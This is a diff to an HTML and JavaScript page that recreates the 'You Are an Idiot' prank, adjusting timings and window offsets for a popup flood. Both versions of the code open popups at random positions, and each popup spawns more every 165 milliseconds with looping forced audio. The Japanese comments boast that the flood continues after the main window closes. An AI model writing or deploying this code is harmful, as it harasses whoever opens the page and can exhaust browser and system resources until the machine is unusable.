@@ -32,7 +32,7 @@
     <h1>YOU ARE AN IDIOT</h1>
     <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
          class="idiot-img" alt="You are an idiot">
-    <p>165msごとに爆速で増えるよ...<br>メイン閉じても止まらない</p>
+    <p>165msごとに爆増中...<br>メイン閉じても止まらない</p>
 
     <audio id="idiotSound" preload="auto" loop></audio>
 
@@ -50,8 +50,8 @@
         function createNewPopup() {
             const width = 480;
             const height = 440;
-            const left = Math.random() * (screen.availWidth - width - 100) + 50;
-            const top = Math.random() * (screen.availHeight - height - 100) + 50;
+            const left = Math.random() * (screen.availWidth - width - 120) + 60;
+            const top = Math.random() * (screen.availHeight - height - 120) + 60;
 
             const popup = window.open('', '_blank', 
                 `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
@@ -67,7 +67,10 @@
                         <style>
                             body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                             h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
-                            .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
+                            .idiot-img { 
+                                max-width:95vw; max-height:72vh; width:auto; height:auto; 
+                                margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; 
+                            }
                             @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
                         </style>
                     </head>
@@ -90,12 +93,12 @@
                                 setTimeout(forcePlay, 20);
                                 setTimeout(forcePlay, 50);
 
-                                // 165msごとに自分も新しいポップアップを生成（メイン閉じても連鎖）
+                                // 165msごとに新しいポップアップを生成（連鎖）
                                 setInterval(() => {
                                     const w = 480;
                                     const h = 440;
-                                    const l = Math.random() * (screen.availWidth - w - 100) + 50;
-                                    const t = Math.random() * (screen.availHeight - h - 100) + 50;
+                                    const l = Math.random() * (screen.availWidth - w - 120) + 60;
+                                    const t = Math.random() * (screen.availHeight - h - 120) + 60;
 
                                     window.open('', '_blank', 
                                         `width=${w},height=${h},left=${Math.floor(l)},top=${Math.floor(t)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
@@ -111,7 +114,7 @@
             }
         }
 
-        // ====================== メイン画面 ======================
+        // メイン画面
         window.onload = () => {
             function mainForcePlay() {
                 sound.currentTime = 0;
@@ -124,12 +127,11 @@
 
             // 初期高速連発
             setTimeout(() => createNewPopup(), 80);
-            setTimeout(() => createNewPopup(), 140);
-            setTimeout(() => createNewPopup(), 200);
-            setTimeout(() => createNewPopup(), 260);
-            setTimeout(() => createNewPopup(), 320);
+            setTimeout(() => createNewPopup(), 150);
+            setTimeout(() => createNewPopup(), 220);
+            setTimeout(() => createNewPopup(), 290);
 
-            // 165ms自動増殖（メイン閉じても影響なし）
+            // 165ms自動増殖
             setTimeout(() => {
                 setInterval(() => {
                     createNewPopup();
